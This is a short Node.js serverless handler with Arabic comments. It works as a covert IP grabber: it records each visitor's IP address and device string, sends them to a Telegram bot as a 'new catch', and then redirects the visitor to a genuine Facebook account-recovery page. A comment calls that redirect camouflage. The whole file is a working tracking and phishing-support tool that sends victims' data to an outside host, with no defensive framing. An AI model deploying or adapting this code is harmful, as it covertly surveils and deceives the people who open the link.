const axios = require('axios');

export default async function handler(req, res) {
    const { BOT_TOKEN, CHAT_ID } = process.env;

    // جمع بيانات الزائر
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'Unknown';
    const ua = req.headers['user-agent'] || 'Unknown';

    const message = `🎯 **صيد جديد!**\n\n🌐 **IP:** \`${ip}\`\n📱 **Device:** \`${ua}\``;

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (e) {
        console.error("TG Error");
    }

    // تمويه: تحويل الزائر لصفحة فيسبوك حقيقية
    return res.redirect(301, 'https://www.facebook.com/recover/personal-site');
}
